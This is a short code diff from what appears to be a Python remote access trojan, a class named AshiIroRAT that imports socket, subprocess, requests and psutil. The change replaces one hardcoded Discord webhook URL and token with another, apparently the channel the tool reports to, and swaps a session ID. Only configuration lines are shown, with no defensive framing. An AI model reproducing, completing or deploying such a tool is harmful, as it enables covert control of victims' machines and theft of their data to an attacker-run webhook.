@@ -2,8 +2,8 @@ import socket, threading, time, os, subprocess, requests, psutil, platform, base
 from datetime import datetime
 import uuid
 
-WEBHOOK = "https://discord.com/api/webhooks/1462249236321009707/95ZY5qeUQiNRUMkMP83t3oCz9_g2GlPSmG-vvrSRVOvi658VY7vwPm37RJrpEa0w3xJe"
-SESSION_ID = "dd2f0bd0-4c1e-4e2b-837b-28858eefbde2"
+WEBHOOK = "https://discord.com/api/webhooks/1463725220337684491/AO554py2QlCE8EixDQsUYU1v2EURivEw_yoSsQIFrY6mnDq22TWq5ZLnIdjTREA1uNiG"
+SESSION_ID = "074788bf-4411-451a-ad48-e2dc539ef1c9"
 
 class AshiIroRAT:
     def __init__(self):
